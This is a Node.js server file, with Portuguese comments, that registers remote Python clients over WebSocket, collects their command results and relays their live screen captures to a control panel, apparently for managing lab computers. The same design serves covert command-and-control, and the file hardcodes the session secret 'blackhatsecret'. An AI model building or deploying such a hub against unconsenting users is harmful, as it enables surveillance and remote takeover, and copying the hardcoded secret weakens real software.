const express = require("express");
const session = require("express-session");
const http = require("http");
const WebSocket = require("ws");

const app = express();
const server = http.createServer(app);
const wsss = new WebSocket.Server({ server });
const PORT = 8000;

app.use(express.urlencoded({ extended: true }));
app.use(express.static("static"));
app.use(express.json());
app.use(session({
  secret: "blackhatsecret",
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 3600000 }
}));

const authRoutes = require("./routes/auth");
const painelRoutes = require("./routes/painel");
const { router: apiRoutes, setLastClient, handleResult, notifyNewComputer } = require("./routes/api");

app.use("/", authRoutes);
app.use("/", painelRoutes);
app.use("/", apiRoutes);

// Mapa para gerenciar clientes registrados
const knownClients = new Map();

wsss.on("connection", (wss, req) => {
  console.log("Nova conexão WebSocket");

  wss.on("message", (msg) => {
    try {
      const data = JSON.parse(msg);

      if (data.type === "id" && data.id) {
        wss.role = "client";
        wss.client_id = data.id;
        knownClients.set(wss.client_id, wss);
        setLastClient(wss);
        console.log("Cliente Python registrado:", wss.client_id);

        const computerInfo = {
          id: wss.client_id,
          ip: wss.client_id,
          lab: "outros",
          status: "online"
        };

        notifyNewComputer(wsss, computerInfo);
        return;
      }

      if (data.role === "panel") {
        wss.role = "panel";
        console.log("Conexão do painel registrada");

        const onlineComputers = [];
        knownClients.forEach((clientwss, clientId) => {
          if (clientwss.readyState === WebSocket.OPEN) {
            onlineComputers.push({
              id: clientId,
              ip: clientId,
              lab: "outros",
              status: "online"
            });
          }
        });

        wss.send(JSON.stringify({
          type: "current_computers",
          computers: onlineComputers
        }));
        return;
      }

      if (wss.role === "client") {
        if (data.type === "result" && data.output) {
          console.log(`[resultado] Cliente ${wss.client_id}:`, data.output);
          handleResult(data.output);
        } else if (data.type === "screen" && data.image) {
          wss.latestImage = data.image;
          wsss.clients.forEach(client => {
            if (client.readyState === WebSocket.OPEN && client.role === "panel") {
              client.send(JSON.stringify({
                type: "screen",
                client_id: wss.client_id,
                image: data.image
              }));
            }
          });
        }
      }
    } catch (err) {
      console.error("Erro ao processar mensagem:", err);
    }
  });

  wss.on("close", () => {
    if (wss.role === "client" && wss.client_id) {
      knownClients.delete(wss.client_id);
      console.log(`Cliente Python desconectado: ${wss.client_id}`);
    } else {
      console.log("Conexão fechada");
    }
  });
});

app.get("/api/connected_clients", (req, res) => {
  const clients = Array.from(knownClients.keys());
  res.json({ clients });
});

server.listen(PORT, "0.0.0.0", () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
